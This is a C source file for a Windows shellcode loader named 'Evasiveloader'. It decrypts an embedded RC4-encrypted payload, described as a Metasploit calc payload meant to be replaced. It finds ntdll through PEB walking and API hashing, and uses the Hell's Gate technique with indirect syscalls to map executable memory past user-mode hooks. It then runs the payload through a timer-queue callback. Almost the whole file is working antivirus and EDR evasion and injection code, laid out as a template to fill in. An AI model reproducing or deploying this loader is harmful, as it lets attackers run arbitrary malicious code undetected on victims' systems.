#pragma once
#pragma warning(disable : 4996)
#include <Windows.h>
#include <stdio.h>
#include "Evasiveloader.h"


//Payload - metasploit x64 calc payload
//Replace with Rc4 encrypted payload
unsigned char Payload[] = { 0xB1, 0xB5, 0xA6, 0xC7, 0x45, 0x37, 0xBF, 0xA2, 0xA8, 0x48, 0xB5, 0x0E, 0xC4, 0x39, 0x0A, 0x97, 0xF7, 0xAA, 0x14, 0x05, 0xD9, 0xA2, 0x30, 0x67, 0xD4, 0x2D, 0x3F, 0xA9, 0xBF, 0x62, 0xD6, 0x31, 0xED, 0xF7, 0xC5, 0xB4, 0xF0, 0x9F, 0x66, 0x5B, 0x48, 0xE8, 0x25, 0xE2, 0x8B, 0x01, 0x00, 0xC9, 0x18, 0xE5, 0xF4, 0xDF, 0xA4, 0x17, 0x78, 0xAB, 0x76, 0x86, 0x72, 0x2F, 0x3D, 0xFB, 0xDE, 0x8A, 0xA6, 0x87, 0xD7, 0x6E, 0xD6, 0xF4, 0x28, 0x52, 0xB3, 0xC4, 0xF2, 0xE3, 0x46, 0xE9, 0x95, 0xD6, 0xA5, 0x41, 0x6D, 0x25, 0x9E, 0x24, 0xD5, 0x7C, 0xE2, 0x8B, 0xD2, 0x2D, 0x56, 0x55, 0x41, 0xBB, 0x09, 0x32, 0x8C, 0xD9, 0xA0, 0x33, 0x49, 0x82, 0x2E, 0x9F, 0x35, 0x0C, 0x0A, 0x67, 0x60, 0xD7, 0xBA, 0xC2, 0xEE, 0xF5, 0x01, 0xDE, 0x20, 0x12, 0xCD, 0xA0, 0xF7, 0x20, 0x5C, 0x1E, 0x42, 0xB8, 0xC0, 0xE9, 0xC6, 0xB9, 0x4E, 0xAF, 0x0B, 0x74, 0x4F, 0xC4, 0x3F, 0x39, 0x5D, 0xDC, 0xB9, 0xB2, 0x4B, 0x6B, 0x15, 0x84, 0xEE, 0xF5, 0x4C, 0x08, 0x21, 0x46, 0x9D, 0x36, 0x47, 0x7E, 0x76, 0x24, 0x71, 0xA1, 0x41, 0xDC, 0xBD, 0x8A, 0xA5, 0xCF, 0x6C, 0xE9, 0xCA, 0x9B, 0xFA, 0x0F, 0x29, 0xDD, 0x33, 0x06, 0xBF, 0x2C, 0xDB, 0x0D, 0xE5, 0x08, 0x3C, 0xB1, 0xAB, 0x0D, 0x22, 0xEA, 0xE3, 0x2E, 0x54, 0x5C, 0xB7, 0xF1, 0xF4, 0x80, 0x50, 0xBE, 0x62, 0xD4, 0x76, 0xC9, 0x13, 0x52, 0x83, 0x93, 0x9C, 0xDC, 0x30, 0x49, 0xBD, 0x37, 0x7D, 0xE6, 0xE2, 0x02, 0x13, 0x87, 0x7D, 0xB8, 0x88, 0x6E, 0x57, 0xE1, 0x39, 0x5C, 0xB8, 0x0F, 0xBC, 0xD4, 0x45, 0x43, 0x3E, 0x93, 0xCE, 0xBF, 0x69, 0xF9, 0x15, 0xDA, 0x5D, 0xE3, 0x23, 0x6E, 0x9F, 0x14, 0xEA, 0xB9, 0x09, 0xFE, 0x6A, 0x41, 0x3E, 0x57, 0x08, 0x86, 0x33, 0xE6, 0x66, 0x3D, 0xBC, 0xCE, 0x9D, 0xF3, 0x62, 0x6B, 0x43, 0x48, 0xAE, 0x7B };
DWORD payloadsize = sizeof Payload;

//-------------------------------------------------------------------------------------------------------
//Hell's gate VX_TABLE and VX_Table entry structures
typedef struct _NTSYSCALL_STRUCT {
	PVOID   ntfuncAddress;
	DWORD64 ntfuncHash;
	WORD    ntSystemCallNumber;
	PVOID	ntindirectSyscallAdd;
} NTSYSCALL_STRUCT, * PNTSYSCALL_STRUCT;

typedef struct _NT_FUNCTIONS {

	NTSYSCALL_STRUCT NtCreateSection;
	NTSYSCALL_STRUCT NtMapViewOfSection;
} NT_FUNCTIONS, * PNT_FUNCTIONS;

//---------------------------------------------------------------------------------------------------------

//---------------------------------------------------------------------------------------------------------
//External function declaration - see evasiveloader.asm
extern VOID setssnsyscall(WORD wSystemCall, PVOID randomSyscallAddress);
extern launchCode();

//Function declarations
BOOL GetImageExportDirectory(
	_In_ PVOID                     pModuleBase,
	_Out_ PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory
);
BOOL PopulateNtSyscallStruct(
	_In_ PVOID pModuleBase,
	_In_ PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
	_In_ PNTSYSCALL_STRUCT pNtsyscall
);
//-----------------------------------------------------------------------------------------------------------
//Macros
#define NtCreateSection_djb2 0x5687F81AC5D1497A //djb2("NtCreateSection")
#define NtMapViewOfSection_djb2 0x0778E82F702E79D4 //djb2("NtMapViewOfSection")

#define Ntdll_djb2 517648621 //apihash("NTDLL.DLL")
#define RANGE       0xFF
//---------------------------------------------------------------------------------------------------------------
//HASH Functions
//dbj2 hash function - from Hell's gate
DWORD64 djb2(PBYTE str) {
	DWORD64 dwHash = 0x77347734DEADBEEF;
	INT c;

	while (c = *str++)
		dwHash = ((dwHash << 0x5) + dwHash) + c;

	return dwHash;
}
//custom djb2 hash function for GetNtdllbase() 
DWORD apihash(const wchar_t* str) {
	DWORD hash = 5381;
	wchar_t c;

	while ((c = *str++)) {
		hash = ((hash << 5) + hash) + c; /* hash * 33 + c */
	}

	return hash;
}
//------------------------------------------------------------------------------------------------------------------

//Custom Function to get base address of Ntdll.dll module

PVOID GetNtdllBase() {
	PVOID ntdllbase = NULL;
	PPEB pPeb = (PPEB)(__readgsqword(0x60));
	PLDR_DATA_TABLE_ENTRY dlliterator = (PLDR_DATA_TABLE_ENTRY)(pPeb->LoaderData->InMemoryOrderModuleList.Flink);
	PLIST_ENTRY Head = (PLIST_ENTRY)&pPeb->LoaderData->InMemoryOrderModuleList;
	PLIST_ENTRY Node = (PLIST_ENTRY)Head->Flink;

	do {
		// Make a copy of the FullDllName.Buffer before converting it to uppercase
		wchar_t dllfullname[MAX_PATH];
		wcsncpy(dllfullname, dlliterator->FullDllName.Buffer, MAX_PATH - 1);
		dllfullname[MAX_PATH - 1] = L'\0';

		CharUpperW(dllfullname); // Convert dllfullname to uppercase using inbuilt winapi CharUpperW

		printf("dll name: %ls\n", dllfullname);

		// Use the copied and modified string for comparison
		if (apihash(dllfullname) == Ntdll_djb2) {
			printf("dll found: %ls\n", dlliterator->FullDllName.Buffer);
			ntdllbase = (PVOID)dlliterator->InInitializationOrderLinks.Flink;
			break; // If found, break out of the loop
		}

		dlliterator = (PLDR_DATA_TABLE_ENTRY)Node->Flink;
		Node = (PLIST_ENTRY)Node->Flink;

	} while (Node != Head);

	return ntdllbase;
}
//------------------------------------------------------------------------------------------------------------------
//Hell's gate Functions to get export directory and populate syscall structures
BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
	// Get DOS header
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		printf("1\n");
		return FALSE;
	}

	// Get NT headers
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		printf("2\n");
		return FALSE;
	}

	// Get the EAT
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}

BOOL PopulateNtSyscallStruct(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PNTSYSCALL_STRUCT pNtsyscall) {
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (djb2(pczFunctionName) == pNtsyscall->ntfuncHash) {
			printf("func hash match found\n");
			pNtsyscall->ntfuncAddress = pFunctionAddress;

			// Quick and dirty fix in case the function has been hooked
			WORD cw = 0;
			while (TRUE) {
				// check if syscall, in this case we are too far
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				// check if ret, in this case we are also probaly too far
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

				// First opcodes should be :
				//    MOV R10, RCX
				//    MOV RCX, <syscall>
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pNtsyscall->ntSystemCallNumber = (high << 8) | low;
					break;
				}

				cw++;
			};
		}
	}

	if (!pNtsyscall->ntfuncAddress) {
		printf("3\n");
		return FALSE;
	}


	// Code to find a random syscall instruction to jump for indirect syscall method
	ULONG_PTR uFuncAddress = (ULONG_PTR)pNtsyscall->ntfuncAddress + 0xFF;

	// getting the 'syscall' instruction of another syscall function
	for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
		if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05) {
			pNtsyscall->ntindirectSyscallAdd = ((ULONG_PTR)uFuncAddress + z);
			break; // break for-loop [x & z]
		}
	}
	return TRUE;
}

//------------------------------------------------------------------------------------------------------------------------------------

//Implementing Hell's gate technique with indirect syscall using Localmap injection technique
BOOL LocalMapInjectSyscall(IN PNT_FUNCTIONS pNtfunc, IN PBYTE Payload, IN SIZE_T payloadsize, OUT PVOID* ppAddress) {

	HANDLE				hSection = NULL;
	HANDLE				hThread = NULL;
	HANDLE				hTimer = NULL;
	PVOID				pAddress = NULL;
	NTSTATUS			STATUS = NULL;
	SIZE_T				sViewSize = NULL;
	LARGE_INTEGER		MaximumSize = {
			.HighPart = 0,
			.LowPart = payloadsize
	};

	setssnsyscall(pNtfunc->NtCreateSection.ntSystemCallNumber, pNtfunc->NtCreateSection.ntindirectSyscallAdd);
	STATUS = launchCode(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	if (STATUS != 0) {
		printf("Map allocate failed\n");
		return FALSE;
	}

	setssnsyscall(pNtfunc->NtMapViewOfSection.ntSystemCallNumber, pNtfunc->NtCreateSection.ntindirectSyscallAdd);
	STATUS = launchCode(hSection, (HANDLE)-1, &pAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
	if (STATUS != 0) {
		printf("MapofViewSection failed\n");
		return FALSE;
	}

	printf("[#] Press <Enter> To Write The Payload ... ");
	getchar();
	memcpy(pAddress, Payload, payloadsize);
	printf("\t[+] Payload is Copied From 0x%p To 0x%p \n", Payload, pAddress);

	//Assign out variable ppAddress
	*ppAddress = pAddress;
	return TRUE;
}
//----------------------------------------------------------------------------------------------------------------------------------------

INT main() {

	unsigned char key[] = {
		//Replace with key used to encrypt payload
		'k', 'e', 'y', 'd', 'e', 'c', '1', '2', '3'
	};
	PVOID dllbase = NULL;
	DWORD keysize = sizeof key;
	HANDLE hTimer = NULL;
	HANDLE hPayload = NULL;
	CHAR str[] = "Ntdll.dll";
	wchar_t input[] = L"Ntdll.dll";
	Rc4EncryptionViaSystemFunc032(key, Payload, keysize, payloadsize);


	dllbase = GetNtdllBase();
	printf("Ntdll base is %p\n", dllbase);

	// Get the EAT of NTDLL
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(dllbase, &pImageExportDirectory) || pImageExportDirectory == NULL) {
		printf("GetImageExportDirectory failed\n");
		return 0x01;
	}
		

	NT_FUNCTIONS Table = { 0 };
	Table.NtCreateSection.ntfuncHash = NtCreateSection_djb2;
	if (!PopulateNtSyscallStruct(dllbase, pImageExportDirectory, &Table.NtCreateSection)) {
		printf("Syscall failed\n");
		return 0x1;
	}
		

	Table.NtMapViewOfSection.ntfuncHash = NtMapViewOfSection_djb2;
	if (!PopulateNtSyscallStruct(dllbase, pImageExportDirectory, &Table.NtMapViewOfSection)) {
		printf("Syscall Failed!\n");
		return 0x1;
	}
		



	LocalMapInjectSyscall(&Table, Payload, payloadsize, &hPayload);


	//Executing payload with callback code execution method - CreateTimerQueueTimer
	if (!CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)hPayload, NULL, NULL, NULL, NULL)) {
		printf("[!] CreateTimerQueueTimer Failed With Error : %d \n", GetLastError());
		return -1;
	}
	getchar();
	return 0;
}